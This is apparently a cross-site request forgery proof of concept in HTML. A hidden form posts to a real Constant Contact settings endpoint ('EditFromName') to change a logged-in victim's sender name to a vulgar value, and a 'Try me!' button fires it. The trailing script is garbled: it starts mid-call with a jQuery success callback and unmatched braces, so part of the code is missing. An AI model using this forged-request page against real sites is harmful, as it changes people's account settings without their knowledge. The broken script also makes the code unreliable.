<!DOCTYPE html>
<html>
<head>
	<title>Heisann</title>
	<script src="jquery-3.1.1.min.js"></script>
</head>
<body>
<form id="myForm" action="https://ui.constantcontact.com/xhr/settings/EditFromName" method="post">
  <input name="oldValue" value="My old value" type="hidden">
  <input name="value" value="I hate my poop" type="hidden">
</form>
<button>Try me!</button>
<script>

		success: function() {
			console.log('done');
		}
	});
});
